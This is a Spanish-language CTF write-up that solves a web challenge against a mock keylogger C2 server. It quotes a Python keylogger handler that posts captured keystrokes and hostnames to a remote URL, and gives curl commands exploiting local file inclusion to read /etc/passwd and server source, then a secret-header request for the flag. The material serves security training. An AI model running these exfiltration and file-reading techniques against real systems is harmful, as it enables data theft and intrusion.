Intro:

![img1](https://github.com/halexys/UciTeam1/blob/main/Spooky_CTF_2024/web/img/web3/image1.png)

Este reto era la continuación de hunted-server, en el cual había un keylogger escrito en python, donde teníamos lo siguiente:
La url del C2: ```url = 'https://haunted-c2.niccgetsspooky.xyz/cgi-bin/614af1b65d944d989a457c21a39b4377.php'```
Y la función que tramitaba la petición al C2:
```python
class Handler(StreamRequestHandler):
    def handle(self):
        while True:
            msg = self.rfile.readline()
            if msg:
                requests.post(url+'?op=upload', json={
                    'data': base64.b64encode(msg).decode('utf-8'),
                    'id': self.connection.fileno(),
                    'time': int(time.time()),
                    'hostname': socket.gethostname()
                })
            else:
                return
```

Como podemos ver, al C2 se tramitaba una petición por POST, donde se mandaba a la url por GET el parámetro os=upload y se tramitaba
por POST los datos recopilados por el keylogger en formato json.

Así que podríamos replicar esta request con curl para ver que nos responde el servidor:
```bash
curl -v -X POST "https://haunted-c2.niccgetsspooky.xyz/cgi-bin/614af1b65d944d989a457c21a39b4377.php?op=upload" \
     -H "Content-Type: application/json" \
     -d '{
           "data": "'"$(echo -n "test" | base64)"'",
           "id": "'"e"'",
           "time": '"$(date +%s)"',
           "hostname": "'"$(hostname)"'"
         }'
```
El servidor nos responde con lo siguiente:

![img2](https://github.com/halexys/UciTeam1/blob/main/Spooky_CTF_2024/web/img/web3/image3.png)

Podemos ver algo bastante interesante en la respuesta:
```Location: /cgi-bin/614af1b65d944d989a457c21a39b4377.php?op=view&file=L3Nydi9sb2dzL3BhcnJvdC1l```
Vemos una ruta para obtener el archivo con los datos enviados al servidor, cargado con el parámetro "file" y algo en base64, que si
lo decodificamos podremos ver que es el nombre del archivo, creado a partir del hostname de nuestra máquina y el id tramitados en la
solicitud.

```bash echo L3Nydi9sb2dzL3BhcnJvdC1l | base64 -d; echo
/srv/logs/parrot-e```

Aqui tenemos una probable vía de LFI, asi que probamos si podemos leer el /etc/passwd:

```bash curl https://haunted-c2.niccgetsspooky.xyz/cgi-bin/614af1b65d944d989a457c21a39b4377.php\?op\=view\&file\=$(echo -n "/etc/passwd" | base64)```

Respuesta del servidor:

![img3](https://github.com/halexys/UciTeam1/blob/main/Spooky_CTF_2024/web/img/web3/image5.png)

En efecto, tenemos LFI. Luego de detectar el LFI, intenté obtener RCE, pero cualquier código inyectado no era interpretado por
el navegador, así que la próxima opción fue intentar leer el archivo php al que se le hacía la solicitud:

```bash curl https://haunted-c2.niccgetsspooky.xyz/cgi-bin/614af1b65d944d989a457c21a39b4377.php\?op\=view\&file\=$(echo -n "../cgi-bin/614af1b65d944d989a457c21a39b4377.php" | base64)```

Y el servidor nos devuelve el archivo:

![img4](https://github.com/halexys/UciTeam1/blob/main/Spooky_CTF_2024/web/img/web3/image4.png)

Y aquí tenemos una parte bastante interesante:

```php
  case 'flag':
      $secret_header = array_key_exists('HTTP_SECRET', $_SERVER) ? $_SERVER['HTTP_SECRET'] : '';
      if ($secret_header === '8662884dcb7e466e878091970e3f5ed9') {
        echo $_SERVER['FLAG'];
        exit();
      } else {
        http_response_code(400);
        exit();
      }
      break;
```
Este código comprueba si en $_SERVER existe HTTP_SECRET. $_SERVER es un array superglobal de php que contiene, entre otras cosas, las
cabeceras HTTP tramitadas al servidor, por ejemplo si se tramita la cabecera "User-Agent: test", la variable $_SERVER[HTTP_USER_AGENT] va 
a contener el valor "test", ya que toma el nombre de la cabecera, y lo convierte a mayúsculas, le agrega delante "HTTP_" y si contiene
guiones medios (-) los convierte en guiones bajos (_). 

Luego, si existe HTTP_SECRET, lo guarda en una variable llamada $secret_header y lo compara con el valor '8662884dcb7e466e878091970e3f5ed9'.
Conociendo esto, podemos crear nuestro payload:

```bash
curl "https://haunted-c2.niccgetsspooky.xyz/cgi-bin/614af1b65d944d989a457c21a39b4377.php?op=flag" -H "SECRET: 8662884dcb7e466e878091970e3f5ed9"
```
y el servidor nos devuelve la flag:

![flag](https://github.com/halexys/UciTeam1/blob/main/Spooky_CTF_2024/web/img/web3/image6.png)
